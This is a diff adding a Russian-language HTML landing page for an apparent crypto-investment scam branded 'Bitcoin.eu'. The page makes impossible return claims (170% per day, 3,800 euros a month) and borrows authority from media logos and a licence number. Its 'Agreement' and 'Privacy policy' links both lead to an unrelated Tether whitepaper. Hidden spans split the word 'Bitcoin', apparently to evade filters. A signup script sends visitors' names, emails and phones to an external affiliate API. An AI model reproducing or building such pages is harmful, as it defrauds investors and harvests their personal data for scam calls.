@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <title>Bitcoin.eu</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
+
+    <link rel="shortcut icon" href="main/img/favicon.ico" type="image/x-icon" />
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+    <link rel="preload" as="style" onload="this.rel='stylesheet'" href="main/css/app.css">
+    <link rel="preload" as="style" onload="this.rel='stylesheet'" href="main/css/lp.css">
+    <link rel="preload" as="style" onload="this.rel='stylesheet'" href="main/css/intlTelInput.css">
+    <link rel="preload" as="style" onload="this.rel='stylesheet'" type="text/css" href="main/css/compliant.css">
+    <link rel="preload" as="style" onload="this.rel='stylesheet'" type="text/css" href="main/css/slick.css">
+    <link rel="preload" as="style" onload="this.rel='stylesheet'" type="text/css" href="main/css/slick-theme.css">
+    <link rel="preload" as="script" href="https://f.vimeocdn.com/p/3.48.3/js/player.js">
+
+    <link rel="stylesheet" href="main/css/lp.css">
+    <link rel="stylesheet" href="main/css/compliant.css">
+    <link rel="stylesheet" href="main/css/app.css">
+    <link rel="stylesheet" href="main/css/intlTelInput.css">
+
+    <link rel="stylesheet" type="text/css" href="main/css/slick.css">
+    <link rel="stylesheet" type="text/css" href="main/css/slick-theme.css">
+    <style>
+        .iti__country {
+            color: #666;
+        }
+    </style>
+</head>
+<body class="index-page font-ubuntu relative">
+<header class="py-4 header__absolute">
+    <div class="header__overlay z-10"></div>
+    <div class="row__container mx-auto relative z-20">
+        <img src="main/img/logo.webp" alt="logo" class="w-1/5 sm:w-1/3">
+    </div>
+</header>
+<div id="slider" class="leading-tight swiper-container">
+    <div class="swiper-wrapper">
+        <div class="banner-item-1 banner-item py-40 sm:py-24 flex items-center">
+            <div class="row__container mx-auto flex items-center">
+                <div class="w-1/2 sm:w-full">
+                    <h2 class="text-white text-6xl leading-extra-tight font-bold uppercase sm:text-4xl">
+                        Bi<span style="display: none">djj%%41231</span>tc<span style="display: none">djj%%41231</span>oin
+                        <br> доступен всем!
+                    </h2>
+                    <p class="text-white text-3xl mt-8 sm:text-2xl">
+                        Приобретите часть Bi<span style="display: none">djj%%41231</span>tc<span style="display: none">djj%%41231</span>oin<br>
+                        <span class="text-primary font-medium"> 200 евро</span> и смело <br>
+                        зарабатывайте ежемесячно!
+                    </p>
+                    <div class="mt-8 flex flex-start">
+                        <a href="#" class="button-main ln-auto to-form px-8 uppercase py-4" data-url="#form">
+                            Зарегистрироваться!
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="banner-item-2 banner-item py-40 sm:py-24 flex items-center">
+            <div class="row__container mx-auto flex items-center">
+                <div class="w-1/2 sm:w-full">
+                    <h2 class="text-white text-6xl leading-extra-tight font-bold uppercase sm:text-4xl">
+                        рекордные <br> <span class="text-primary"> 51,500$!</span>
+                    </h2>
+                    <p class="text-white text-3xl mt-8 sm:text-2xl">
+                        Криптовалюта Bi<span style="display: none">djj%%41231</span>tc<span style="display: none">djj%%41231</span>oin
+                        <br>
+                        достигла рекордной цены!
+                    </p>
+                    <div class="mt-12 flex flex-start">
+                        <a href="#" class="button-main ln-auto to-form px-8 uppercase py-4" data-url="#form">
+                            Зарегистрироваться!
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="banner-item-3 banner-item py-40 sm:py-24 flex items-center">
+            <div class="row__container mx-auto flex items-center">
+                <div class="w-1/2 sm:w-full">
+                    <h2 class="text-white text-6xl leading-extra-tight font-bold uppercase sm:text-4xl">
+                        больше <br> <span class="text-primary">110 млн.</span> <br> пользователей
+                    </h2>
+                    <p class="text-white text-3xl mt-8 sm:text-2xl">
+                        Криптовалюты продолжают <br>
+                        набирать популярность!
+                    </p>
+                    <div class="mt-12 flex flex-start">
+                        <a href="#" class="button-main ln-auto to-form px-8 uppercase py-4" data-url="#form">
+                            Зарегистрироваться!
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+    </div>
+
+</div>
+<style>
+    .sm\:w-full {
+        width: 100%;
+    }
+    .relative {
+        position: relative;
+    }
+    .z-20 {
+        z-index: 20;
+    }
+    .mx-auto {
+        margin-left: auto;
+        margin-right: auto;
+    }
+    .slick-dots {
+        position: static;
+        display: block;
+        width: 100%;
+        padding: 0;
+        margin: 0;
+        list-style: none;
+        text-align: center
+    }
+
+    .slick-dots li {
+        position: relative;
+        display: inline-block;
+        width: 10px;
+        height: 10px;
+        margin: 0 5px;
+        padding: 0;
+        cursor: pointer
+    }
+
+    .slick-dots li button {
+        font-size: 0;
+        line-height: 1;
+        display: block;
+        width: 10px;
+        height: 10px;
+        padding: 0;
+        cursor: pointer;
+        color: transparent;
+        border: 0;
+        outline: 0;
+        background: 0 0
+    }
+
+    .slick-dots li button:focus, .slick-dots li button:hover {
+        outline: 0
+    }
+
+    .slick-dots li button:focus:before, .slick-dots li button:hover:before {
+        opacity: 1;
+        background: #00c46b
+    }
+
+    .slick-dots li button:before {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 8px;
+        height: 8px;
+        content: '';
+        text-align: center;
+        background: #ecebeb;
+        border-radius: 20px;
+        -webkit-transform: translate(-50%, -50%);
+        transform: translate(-50%, -50%);
+        -webkit-transition: background .3s;
+        transition: background .3s
+    }
+
+    .slick-dots li.slick-active button:before {
+        opacity: 1;
+        background: #00c46b
+    }
+
+    .rg-head .slick-dots {
+        margin-top: 10px
+    }
+
+    .rg-head .slick-dots li {
+        cursor: auto
+    }
+
+    .slick-dots {
+        position: static;
+        display: block;
+        width: 100%;
+        padding: 0;
+        margin: 0;
+        list-style: none;
+        text-align: center
+    }
+
+    .slick-dots li {
+        position: relative;
+        display: inline-block;
+        width: 10px !important;
+        height: 10px !important;
+        margin: 0 5px !important;
+        padding: 0 !important;
+        cursor: pointer
+    }
+
+    .slick-dots li button {
+        font-size: 0 !important;
+        line-height: 1 !important;
+        display: block !important;
+        width: 10px !important;
+        height: 10px !important;
+        padding: 0 !important;
+        cursor: pointer !important;
+        color: transparent !important;
+        border: 0 !important;
+        outline: 0 !important;
+        background: 0 0 !important;
+    }
+
+    .slick-dots li button:focus, .slick-dots li button:hover {
+        outline: 0
+    }
+
+    .slick-dots li button:before {
+        position: absolute !important;
+        top: 50% !important;
+        left: 50% !important;
+        width: 10px !important;
+        height: 10px !important;
+        content: '' !important;
+        text-align: center !important;
+        border-radius: 20px !important;
+        -webkit-transform: translate(-50%, -50%) !important;
+        transform: translate(-50%, -50%) !important;
+        -webkit-transition: background .3s !important;
+        transition: background .3s !important;
+    }
+
+    #slider .slick-dots {
+        position: absolute;
+        bottom: 25px;
+        background: rgba(255, 255, 255, .2);
+        border-radius: 16px;
+        width: auto;
+        left: 50%;
+        -webkit-transform: translateX(-50%);
+        transform: translateX(-50%);
+        padding: 0 5px 9px
+    }
+
+    #slider .slick-dots li.slick-active button:before {
+        background: #fff
+    }
+
+    #slider .slick-dots li button:before {
+        background: 0 0;
+        border: 1px solid #fff
+    }
+
+
+    .slick-dotted.slick-slider {
+        margin-bottom: 0 !important;
+
+    }
+    @media (max-width: 767px){
+        .sm\:order-1 {
+            -webkit-box-ordinal-group: 2;
+            order: 1;
+        }
+        .banner-item-3 {
+            background-image: url(main/img/popular11.webp);
+        }
+
+    }
+
+</style>
+<div class="video-banner">
+    <div class="video-banner__overlay"></div>
+    <div class="video-first" style="padding:56.25% 0 0 0;position:relative;">
+        <iframe src="https://player.vimeo.com/video/658581106?badge=0&amp;background=1&amp;loop=1&amp;autoplay=1&amp;muted=1&amp;player_id=0&amp;app_id=58479&amp;h=d9f32e8b1c"
+                frameborder="0" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen title="bitcoin_1"
+                style=" width: 100vw;
+    height: 56.25vw;
+    min-height: 100vh;
+    min-width: 177.77vh;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    " frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen
+                allow="autoplay; fullscreen; picture-in-picture"></iframe>
+
+    </div>
+    <div class="row__container">
+        <div class="text-center">
+            <span class="video-banner__title">
+                Средний заработок на Bi<span style="display: none">djj%%41231</span>tc<span style="display: none">djj%%41231</span>oin превышает 3 800 евро ежемесячно!
+            </span><br>
+            <a href="#" class="button-main reg-button-wide ln-auto to-form" data-url="#form">
+                НАЧАТЬ!
+                <div class="cta"><span class="arrows primera next "></span> <span class="arrows segunda next "></span>
+                </div>
+            </a>
+        </div>
+    </div>
+
+    <div class="numbers">
+        <div class="numbers__overlay"></div>
+        <div class="numbers__wrap">
+            <div class="numbers__item">
+                <img src="main/img/clients.svg" alt="" class="mx-auto">
+                <div class="numbers__some full">18,000+</div>
+                <div class="numbers__some short">18K+</div>
+                <span class="numbers__caption">пользователей</span>
+            </div>
+            <div class="numbers__item">
+                <img src="main/img/planet-earth.svg" alt="" class="mx-auto">
+                <div class="numbers__some">от 170%</div>
+                <span class="numbers__caption">доходность в день</span>
+            </div>
+            <div class="numbers__item">
+                <img src="main/img/wallet.svg" alt="" class="mx-auto">
+                <div class="numbers__some">от 2015</div>
+                <span class="numbers__caption">года помогаем зарабатывать </span>
+            </div>
+            <div class="numbers__item">
+                <img src="main/img/chat.svg" alt="" class="mx-auto">
+                <div class="numbers__some">24/7</div>
+                <span class="numbers__caption">поддержки представителей</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="bg-semi-black main-page">
+    <div class="row__container">
+        <br><br><br><br>
+        <div class="banner__title text-center">
+            БУДУЩЕЕ ИНВЕСТИЦИЙ УЖЕ ЗДЕСЬ
+        </div>
+        <br><br><br>
+        <div class="first-screen__video first-screen__video--index">
+            <a href="#" class="to-form ln-auto" data-url="#form">
+                <img srcset="main/img/macbook1x.png 1x, main/img/macbook2x.png 2x" alt="" class="platform">
+                <div class="video-div visible-desktop active" id="hero-vid-sec" autoplay="autoplay" muted="muted" loop=""
+                       playsinline="">
+                    <iframe src="https://player.vimeo.com/video/658581215?badge=0&amp;autopause=0&amp;player_id=0&amp;background=1&amp;app_id=58479&amp;h=58e725f78d"
+                            frameborder="0" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen
+                            style="position:absolute;top:0;left:0;width:100%;height:100%;"
+                            title="Webplatform_RU"></iframe>                </div>
+                <img src="main/img/iphone_11.webp" alt="" class="first-screen__app">
+                <div class="video-div app-video active" autoplay="autoplay" muted="muted" loop="" playsinline="">
+                    <iframe src="https://player.vimeo.com/video/658581174?badge=0&amp;background=1&amp;autopause=0&amp;player_id=0&amp;app_id=58479&amp;h=ea3f1b2e74" frameborder="0" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen style="position:absolute;top:0;left:0;width:100%;height:100%;" title="main"></iframe>
+                </div>
+            </a>
+        </div>
+
+        <div class="text-center">
+            <a href="#" class="button-main reg-button-wide ln-auto to-form" data-url="#form">
+                Узнать подробнее
+                <div class="cta"><span class="arrows primera next "></span> <span class="arrows segunda next "></span>
+                </div>
+            </a>
+        </div>
+    </div>
+
+    <div class="row__container">
+        <br><br><br><br><br><br>
+        <div class="banner__title text-center">
+            Почему Bi<span style="display: none">djj%%41231</span>tc<span style="display: none">djj%%41231</span>oin
+            настолько надежен?
+        </div>
+        <br><br><br>
+        <div style="line-height: 1.2; font-size: 18px">
+            Bi<span style="display: none">djj%%41231</span>tc<span style="display: none">djj%%41231</span>oin
+            воспринимается всеми как децентрализованная и очень надежная валюта, подкрепленная мощными
+            криптографическими алгоритмами, отвечающими военным стандартам. При этом обладатель этой криптовалюты при
+            проведении транзакций в Bi<span style="display: none">djj%%41231</span>tc<span style="display: none">djj%%41231</span>oin
+            не обязан раскрывать идентифицирующую его информацию, в отличие от других
+            популярных видов оплаты. На данный момент Bi<span style="display: none">djj%%41231</span>tc<span
+                    style="display: none">djj%%41231</span>oin является фаворитом миллиардеров и предпринимателей из
+            Кремниевой долины.
+        </div>
+        <br><br><br>
+        <div class="text-center">
+            <a href="#" class="button-main reg-button-wide ln-auto to-form" data-url="#form">
+                Узнать подробнее
+                <div class="cta"><span class="arrows primera next "></span> <span class="arrows segunda next "></span>
+                </div>
+            </a>
+        </div>
+    </div>
+
+    <div class="row__container mx-auto flex items-center pt-20 justify-between sm:flex-col">
+        <div class="w-2/3 sm:w-full sm:order-2">
+            <p class="text-white mt-8" style="line-height: 1.2; font-size: 18px">
+                Bi<span style="display: none">djj%%41231</span>tc<span style="display: none">djj%%41231</span>oin
+                поддерживает обмен и вывод денег на карты Виза и Мастеркард. <br class="lg:block hidden"> Вы можете
+                воспользоваться
+                всеми
+                преимуществами цифровой валюты в приложении своего банка!
+            </p>
+        </div>
+        <div class="w-1/3 sm:w-full sm:order-1">
+            <img src="main/img/card_bitcoin.webp" alt="card" class="mx-auto">
+        </div>
+    </div>
+
+    <div class="afl-wrap">
+        <div class="row__container">
+            <div class="afl-why" id="why">
+                <div class="afl-why__head">КАК НАЧАТЬ?</div>
+                <div class="afl-why__body">
+                    <div class="promote">
+                        <div class="promote__item">
+                            <a href="#" class="to-form ln-auto" data-url="#form">
+                                <img src="main/img/tap1.svg" alt="" class="mx-auto">
+                                <p class="promote__title">Заполните форму регистрации внизу страницы</p>
+                            </a>
+                        </div>
+                        <div class="promote__item">
+                            <a href="#" class="to-form ln-auto" data-url="#form">
+                                <img src="main/img/tap2.svg" alt="" class="mx-auto">
+                                <p class="promote__title">Познакомьтесь с вашим наставником и пройдите инструктаж</p>
+                            </a>
+                        </div>
+                        <div class="promote__item">
+                            <a href="#" class="to-form ln-auto" data-url="#form">
+                                <img src="main/img/tap3.svg" alt="" class="mx-auto">
+                                <p class="promote__title">Внесите вашу пробную инвестицию</p>
+                            </a>
+                        </div>
+                        <div class="promote__item">
+                            <a href="#" class="to-form ln-auto" data-url="#form">
+                                <img src="main/img/tap4.svg" alt="" class="mx-auto">
+                                <p class="promote__title">Получите прибыль в течение суток!</p>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <img src="main/img/wave.svg" alt="" class="afl-wave">
+    </div>
+
+    <div class="row__container">
+        <form class="banner__wrap main_form" id="form">
+            <div class="banner__item">
+                <div class="modal--black" id="s_inline">
+                    <p class="form-title">Зарегистрируйтесь и начните зарабатывать на Bi<span style="display: none">djj%%41231</span>tc<span
+                                style="display: none">djj%%41231</span>oin!</p>
+                    
+                    <!----><!--Заполните данные--><!---->
+                    <input type="hidden" name="link_id" value="2113" />  
+                    <input type="hidden" name="source" value="Bitcoin_eu" />
+				    <input name="message" type="hidden" value="0">
+				    <input name="time" class="registration__time" type="hidden" value="0">
+                    <!----><!--Заполните данные--><!---->
+                    
+                    <br>
+                    <div class="form-group">
+                        <label class="label-form">Ваше имя</label>
+                        <div class="control-form" id="s_inline-name">
+                            <input type="text" class="field-form" id="fname" name="fname" autocapitalize="off" autocomplete="off"
+                                   maxlength="255" required="">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label class="label-form">Ваша фамилия</label>
+                        <div class="control-form" id="s_inline-name">
+                            <input type="text" class="field-form" id="lname" name="lname" autocapitalize="off" autocomplete="off"
+                                   maxlength="255" required="">
+                    </div>
+                    </div>
+                    <div class="form-group">
+                        <label class="label-form">Ваш Email</label>
+                        <div class="control-form" id="s_inline-email">
+                            <input type="email" class="field-form" name="email" id="email" autocapitalize="off"
+                                   autocomplete="on" maxlength="255" required="">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label class="label-form">Ваш номер телефона</label>
+                        <div class="control-form" id="s_inline-phone">
+                            <input type="text" class="field-form phone" id="fullphone" name="fullphone" autocapitalize="off"
+                                   autocomplete="on" required="">
+                        </div>
+                    </div>
+
+                    <br>
+                    <button type="submit" class="submit_btn button-main s2_btn reg-button-wide hasPointer text-uppercase">
+                        Зарегистрироваться
+                    </button>
+                    <p class="main-form__after">
+                        Регистрируясь, я принимаю:
+                        <a href="https://tether.to/wp-content/uploads/2016/06/TetherWhitePaper.pdf" target="_blank">Договор</a>
+                        и
+                        <a href="https://tether.to/wp-content/uploads/2016/06/TetherWhitePaper.pdf" target="_blank">
+                            Политику конфиденциальности</a>.
+                    </p>
+
+
+                    <div class="notice">
+                        *Чтобы верифицировать аккаунт и получить выплаты, совершите минимум 1 сделку в течение 30 дней.
+                    </div>
+                </div>
+            </div>
+            <div class="form_message error inactive"
+                 style="margin:15px 0;background-color: #ffd4d4;border: 2px dashed #ce0909;border-radius: 10px;padding: 20px;max-width: 350px;"></div>
+        </form>
+        <style>
+            .form_message.error.inactive{
+                display: none;
+            }
+            .form_message.error.active {
+                display: block;
+                order: 2;
+                color: black;
+                line-height: 17px;
+            }
+        </style>
+        <div class="same-screen">
+            <div class="slider-title text-center wow fadeIn" data-wow-duration="3s">МЕДИА О НАС</div>
+            <div class="flex justify-between mt-12 main__slider--logos fadeIn wow sm:flex-col items-center sm:justify-center"
+                 data-wow-duration="3s">
+                <div class="media-item sm:flex sm:justify-center">
+                    <img src="main/img/forbes.png" alt="" title="" class="sm:w-3/4">
+                </div>
+                <div class="media-item sm:flex sm:justify-center">
+                    <img src="main/img/techcrunch.svg" alt="" title="">
+                </div>
+                <div class="media-item sm:flex sm:justify-center">
+                    <img src="main/img/tnyt.png" alt="" title="" class="sm:w-3/4">
+                </div>
+                <div class="media-item sm:flex sm:justify-center">
+                    <img src="main/img/coindesk.png" alt="" title="" class="sm:w-3/4">
+                </div>
+                <div class="media-item sm:flex sm:justify-center">
+                    <img src="main/img/bbc.png" alt="" title="" class="sm:w-3/4">
+                </div>
+                <div class="media-item sm:flex sm:justify-center">
+                    <img src="main/img/bi.png" alt="" title="" class="sm:w-3/4">
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="payment-logos">
+    <div class="row__container">
+        <img src="main/img/visa2.svg" alt="">
+        <img src="main/img/Mastercard-logo.svg" alt="">
+        <img src="main/img/Maestro_2016.webp" alt="">
+        <img src="main/img/wire-transfer-logo.svg" alt="">
+    </div>
+</div>
+<div class="footer__copyright">
+    <div class="row__container">
+        «Bi<span style="display: none">djj%%41231</span>tc<span style="display: none">djj%%41231</span>oin EU» LLC. Для
+        получения поддержки по вопросам использования системы ООО «Bi<span
+                style="display: none">djj%%41231</span>tc<span style="display: none">djj%%41231</span>oin EU» LLC.
+        пользователи могут оставить заявку выше и получить консультацию специалиста. Лицензия криптовалютной биржи
+        №023-90781
+    </div>
+</div>
+<style>
+    @media (min--moz-device-pixel-ratio: 1.5),(-webkit-min-device-pixel-ratio: 1.5),(min-device-pixel-ratio: 1.5),(min-resolution: 1.5dppx) {
+        .banner__wrap {
+            background-image: url(main/img/wave.png)
+        }
+    }
+</style>
+
+<script data-cfasync="false" src="main/js/email-decode.js"></script>
+<script src="main/js/jquery.js"></script>
+<script>window.jQuery || document.write('<script src="jquery-1.11.2.min.js.html"><\/script>')</script>
+
+<script src="main/js/slick_002.js"></script>
+
+
+<script>
+
+
+    $(".to-form").on('click', function (event) {
+        var anchor = $(this);
+        $('html, body').animate({
+            scrollTop: $(anchor.data('url')).offset().top - 100
+        }, 1000);
+        event.preventDefault();
+    });
+</script>
+<script src="main/js/jquery_002.js"></script>
+<script src="main/js/intlTelInput.js"></script>
+<script src="main/js/jquery.maskedinput.js"></script>
+<script src="main/js/jquery.validate.js"></script>
+
+
+<script type="text/javascript" src="main/js/slick.js"></script>
+<script>
+    $('.swiper-wrapper').slick({
+        arrows: false,
+        dots: true,
+        infinite: true,
+        autoplay: true,
+        speed: 1000,
+        autoplaySpeed: 4000,
+        fade: true,
+        cssEase: 'linear'
+    });
+</script>
+<script src="https://cdn.report/build/build.signup.js"></script>
+<script>
+    function authorized(data) {
+                if (data) {
+                    const { url } = data;
+                    if (url) {
+                        location.href = url;
+                    }
+                }
+            }
+    new $shared['signup']({
+            className: 'main_form', // class name of form
+            fields: {
+ fullphone: { required: true }, // Phone number (Mandatory)
+                email: { required: true }, // User email (Mandatory)
+                fname: { required: true }, // First name (Mandatory)
+                lname: { required: false }, // Last name
+                source: { required: true }, // Doesn't matter what you will put here (Mandatory)
+                link_id: { required: true }, // Your uniq client ID
+                type: { required: true }, // If value is internal password will be static. If you do not know what is that do not touch it
+                // type: { required: true } // Type of registration.
+            }, // field that will be passed to API
+            headers: {
+                'Content-Type': 'application/json',
+                'point': "js",
+            }, // Headers
+            triggers: {
+                error: true,
+                success: true
+            }, // Triggers for modal window, when result is fail or success. You can enable or disable it. Regarding this params you can see notification about status or so.
+            url: 'https://cdn.report/rest/affboard', // Api url
+            translation: {
+                ru: {
+                    1: 'Ведите последние 5 цифр номера с которого вам поступил звонок',
+                    2: 'Код не верен',
+                    200: "Регистрация успешно пройдена",
+                    400: 'Возникли проблемы с регистрацией пользователя. Возможные причины: ',
+                    403: 'Не все обязательные поля были заполнены',
+                    500: 'Временные неполадки сервера, извините. Попробуйте позже, мы уже проводим технические работы по исправлению данной проблемы!',
+                    423: 'Мы заподозрили странную активность с вашего IP попробуйте через 5 секунд и удостоверьтесь что вы ввели правильные данные',
+                },
+                en: {
+                    1: 'Put 5 last digits of number from we are calling right now',
+                    2: 'Code is not right',
+                    200: "Registration was success",
+                    423: 'We suspected strange activity from your IP try in 5 seconds and make sure you entered the correct data',
+                    403: 'Validation was not passed',
+                    400: 'There were problems with the user registration. Possible reasons:',
+                    500: 'Temporary server problems, sorry. Later, we are already doing technical work to fix this problem!'
+                }
+            }, // Not required. Use if you want to change the translation
+            clear: [ 'email', 'fullphone', 'fname', 'lname' ], // Not required. Use if you want to clear some field after registration,
+            voice: 0 // 1 if you need verify the number of client, 0 vice versa. - Do not use it NOW just for request!
+        });
+</script>
+</body>
+</html>
